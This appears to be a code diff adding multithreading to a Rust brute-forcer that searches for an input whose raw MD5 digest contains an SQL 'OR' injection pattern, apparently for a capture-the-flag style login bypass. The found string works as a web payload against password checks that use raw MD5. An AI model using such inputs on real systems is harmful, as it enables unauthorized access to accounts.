@@ -1,9 +1,17 @@
+use std::{
+    sync::{atomic::AtomicBool, mpsc},
+    thread,
+};
+
 use md5::{
     digest::{core_api::CoreWrapper, FixedOutputReset, Output},
     Digest, Md5, Md5Core,
 };
 use once_cell::sync::Lazy;
 use regex::bytes::Regex;
+
+#[cfg(feature = "rayon")]
+use rayon::iter::ParallelIterator;
 
 /// Regex to detect an escape, followed by an OR pattern, followed by another opening single quote then a digit
 /// This is significantly faster than the string search method, but slower than the sliding window.
@@ -41,22 +49,72 @@ fn window_byte_validate(digest: &[u8]) -> bool {
     false
 }
 
+#[cfg(not(feature = "rayon"))]
+fn multi_thread<T, F>(func: F) -> T
+where
+    T: Send + 'static,
+    F: Fn(&AtomicBool) -> Option<T> + Sync,
+{
+    let threads = std::thread::available_parallelism()
+        .map_or_else(|_| {
+            eprintln!("Failed to determine number of available parallelisms, defaulting to single thread."); 1
+        }, std::num::NonZeroUsize::get);
+
+    let (tx, rx) = mpsc::channel();
+    let finished = AtomicBool::new(false);
+
+    thread::scope(|x| {
+        for _ in 0..threads {
+            x.spawn(|| {
+                let thread_tx = tx.clone();
+                let res = func(&finished);
+                let _ = thread_tx.send(res);
+            });
+        }
+
+        if let Ok(Some(res)) = rx.recv() {
+            finished.store(true, std::sync::atomic::Ordering::Release);
+            return res; // This returns to thread::scope, which returns the function.
+        }
+        unreachable!();
+    })
+}
+
+#[cfg(feature = "rayon")]
+fn rayon_multi_thread<T: Send, F: Fn(&AtomicBool) -> Option<T> + Sync>(func: F) {
+    let checker = AtomicBool::new(false);
+    rayon::iter::repeat(())
+        .filter_map(|()| {
+            let res = func(&checker);
+            checker.store(true, std::sync::atomic::Ordering::Relaxed); // Terminate all other threads once one returns.
+            res
+        })
+        // .find_any(|_| true)
+        .find_any(|_| true)
+        .unwrap();
+}
+
 // 87153179503375488964249572016766023268706569805029887102402011499288342510775092757977654940386142689199562616975803271832089582121260280598138107679172885818920928633840231384484533108096150415512236913966
 
 fn main() {
     #[cfg(feature = "time")]
     let start = std::time::Instant::now();
 
-    crack();
+    #[cfg(all(not(feature = "time"), feature = "rayon"))]
+    rayon_multi_thread(crack);
+
+    #[cfg(all(not(feature = "time"), not(feature = "rayon")))]
+    multi_thread(crack);
 
     #[cfg(feature = "time")]
     {
+        crack(&AtomicBool::new(false));
         let end = std::time::Instant::now();
         println!("Finished in {:?}", end - start);
     }
 }
 
-fn crack() {
+fn crack(finished: &AtomicBool) -> Option<String> {
     // Create all in memory objects here to reduce re-allocation.
     let mut i: usize = 0;
     let mut buf: Vec<u8> = Vec::with_capacity(400);
@@ -64,14 +122,15 @@ fn crack() {
     let mut hasher = Md5::new();
     let mut gen_digest: Output<CoreWrapper<Md5Core>>;
     let mut digest: &[u8];
-    loop {
-        if i % 1_000_000 == 0 {
+
+    while !finished.load(std::sync::atomic::Ordering::Relaxed) {
+        if i % 10_000_000 == 0 {
             println!("i = {i}");
         }
 
         #[cfg(feature = "perf")]
         if i > 10_000_000 {
-            return;
+            return None;
         }
 
         if i % 100 == 0 {
@@ -90,14 +149,16 @@ fn crack() {
 
         // Check if we can create the OR statement from it.
         if window_byte_validate(digest) {
-            println!("Found! i = {i}");
+            println!("Found after {i} hashes");
             let string = buf.iter().map(|&c| c as char).collect::<String>();
-            println!("Content = `{string}`");
+            println!("Input = `{string}`");
             let str_digest = String::from_utf8_lossy(digest);
-            println!("Raw md5 Hash = {str_digest}");
-            return;
+            println!("Raw md5 Hash = \n{str_digest}");
+            return Some(string);
         }
     }
+
+    None
 }
 
 fn rust_digest(hasher: &mut Md5, buf: &[u8]) -> Output<CoreWrapper<Md5Core>> {
